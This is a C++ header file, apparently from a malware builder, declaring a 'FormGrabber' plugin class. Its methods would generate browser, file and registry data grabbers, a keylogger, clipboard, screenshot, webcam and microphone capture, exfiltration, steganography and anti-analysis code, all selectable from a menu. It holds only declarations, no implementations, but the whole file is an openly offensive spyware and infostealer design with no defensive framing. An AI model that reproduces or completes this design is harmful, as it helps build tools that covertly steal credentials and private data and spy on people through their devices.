#pragma once
#include <string>
#include <vector>

// Configuration structure for form grabbing
struct FormGrabberConfig {
    bool grabBrowserData;
    bool grabSystemData;
    bool grabNetworkData;
    bool grabFileData;
    bool grabRegistryData;
    bool grabClipboardData;
    bool grabScreenshotData;
    bool grabKeylogData;
    bool grabWebcamData;
    bool grabMicrophoneData;
    bool useEncryption;
    bool useCompression;
    bool useSteganography;
    bool useExfiltration;
    bool addAntiAnalysis;
};

// Form Grabber Plugin Interface
class FormGrabber {
private:
    FormGrabberConfig config;

    // Utility functions
    std::string generateBrowserGrabber();
    std::string generateSystemGrabber();
    std::string generateNetworkGrabber();
    std::string generateFileGrabber();
    std::string generateRegistryGrabber();
    std::string generateClipboardGrabber();
    std::string generateScreenshotGrabber();
    std::string generateKeylogger();
    std::string generateWebcamGrabber();
    std::string generateMicrophoneGrabber();
    std::string generateEncryption();
    std::string generateCompression();
    std::string generateSteganography();
    std::string generateExfiltration();
    std::string generateAntiAnalysis();

    // Menu handlers
    void handleBrowserGrabber();
    void handleSystemGrabber();
    void handleNetworkGrabber();
    void handleFileGrabber();
    void handleRegistryGrabber();
    void handleClipboardGrabber();
    void handleScreenshotGrabber();
    void handleKeylogger();
    void handleWebcamGrabber();
    void handleMicrophoneGrabber();
    void handleEncryption();
    void handleCompression();
    void handleSteganography();
    void handleExfiltration();
    void handleAntiAnalysis();
    void handleConfiguration();

public:
    FormGrabber();
    ~FormGrabber();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);

    // Form Grabbing Methods
    std::string createBrowserGrabber(const std::string& targetBrowsers);
    std::string createSystemGrabber(const std::string& targetData);
    std::string createNetworkGrabber(const std::string& targetProtocols);
    std::string createFileGrabber(const std::string& targetPaths);
    std::string createRegistryGrabber(const std::string& targetKeys);
    std::string createClipboardGrabber();
    std::string createScreenshotGrabber();
    std::string createKeylogger();
    std::string createWebcamGrabber();
    std::string createMicrophoneGrabber();
    std::string addEncryption(const std::string& data, const std::string& key);
    std::string addCompression(const std::string& data);
    std::string addSteganography(const std::string& data, const std::string& carrier);
    std::string addExfiltration(const std::string& data, const std::string& method);
    std::string addAntiAnalysis(const std::string& code);

    // Configuration methods
    void setGrabBrowserData(bool grab);
    void setGrabSystemData(bool grab);
    void setGrabNetworkData(bool grab);
    void setGrabFileData(bool grab);
    void setGrabRegistryData(bool grab);
    void setGrabClipboardData(bool grab);
    void setGrabScreenshotData(bool grab);
    void setGrabKeylogData(bool grab);
    void setGrabWebcamData(bool grab);
    void setGrabMicrophoneData(bool grab);
    void setUseEncryption(bool use);
    void setUseCompression(bool use);
    void setUseSteganography(bool use);
    void setUseExfiltration(bool use);
    void setAddAntiAnalysis(bool add);

    // Menu interface
    void showMenu();
};
